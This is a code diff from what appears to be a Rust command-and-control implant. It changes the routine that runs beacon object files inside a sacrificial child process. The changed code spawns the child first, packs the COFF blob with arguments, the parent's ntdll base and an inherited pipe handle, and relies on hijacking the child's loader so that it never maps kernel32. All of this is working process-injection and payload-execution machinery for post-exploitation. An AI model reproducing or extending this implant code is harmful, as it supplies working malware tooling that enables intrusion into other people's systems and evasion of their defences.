@@ -146,12 +146,14 @@ impl Drop for PipeRead {
 /// thread (cross-process handle/memory/context ops). Single-threaded beacon
 /// context.
 pub unsafe fn bof_isolated(blob: &[u8], args: &[String]) -> Result<Response, &'static str> {
-    let payload = pack_payload(blob, args);
+    // Spawn FIRST: the payload needs the child's inherited stdout handle
+    // value (bof-host has no kernel32 to call GetStdHandle).
+    let (mut proc, pipe_read, pipe_write_val) =
+        unsafe { crate::inject::create_sacrificial_isolated(SPAWN_TO) }?;
+    let payload = pack_payload(blob, args, pipe_write_val);
     let mut image = Vec::with_capacity(BOF_HOST_BLOB.len() + payload.len());
     image.extend_from_slice(BOF_HOST_BLOB);
     image.extend_from_slice(&payload);
-
-    let (mut proc, pipe_read) = unsafe { crate::inject::create_sacrificial_isolated(SPAWN_TO) }?;
     let pipe = PipeRead(pipe_read);
     // No loader-readiness gate: the child's Ldr module list can stay NULL
     // in non-interactive sessions (observed on windows-latest even for a
@@ -187,20 +189,23 @@ unsafe fn run_in_child(
 /// `[u32 blob_len][COFF blob][u32 args_len][args]` (crates/bof-host lib.rs
 /// layout). `args` uses the exact CS beacon.h packing of the inline loader
 /// ([`crate::bof::pack_args`] — verbatim reuse).
-fn pack_payload(blob: &[u8], args: &[String]) -> Vec<u8> {
+fn pack_payload(blob: &[u8], args: &[String], pipe_write_val: usize) -> Vec<u8> {
     let packed_args = crate::bof::pack_args(args);
-    // The parent's kernel32 base, appended after the args: the sacrificial
-    // child shares image bases (boot-level ASLR) and its own Ldr list can be
-    // null (suspended+resumed child), so bof-host falls back to this when
-    // its PEB walk finds nothing (see bof-host lib.rs export_addr).
-    let k32 = unsafe { nyx_implant_core::resolve::module_base_by_name(b"kernel32.dll") }
+    // The parent's ntdll base + the child's inherited stdout handle value,
+    // appended after the args: the sacrificial child never maps kernel32
+    // (loader is hijacked before LdrpInitializeProcess), so bof-host
+    // resolves everything from ntdll (same-boot ASLR: bases are shared) and
+    // writes output with NtWriteFile on the inherited handle (see bof-host
+    // lib.rs export_addr / shim.rs out_write).
+    let nt = unsafe { nyx_implant_core::resolve::module_base_by_name(b"ntdll.dll") }
         .unwrap_or(core::ptr::null_mut()) as u64;
-    let mut out = Vec::with_capacity(8 + blob.len() + packed_args.len() + 8);
+    let mut out = Vec::with_capacity(8 + blob.len() + packed_args.len() + 16);
     out.extend_from_slice(&(blob.len() as u32).to_le_bytes());
     out.extend_from_slice(blob);
     out.extend_from_slice(&(packed_args.len() as u32).to_le_bytes());
     out.extend_from_slice(&packed_args);
-    out.extend_from_slice(&k32.to_le_bytes());
+    out.extend_from_slice(&nt.to_le_bytes());
+    out.extend_from_slice(&(pipe_write_val as u64).to_le_bytes());
     out
 }
 
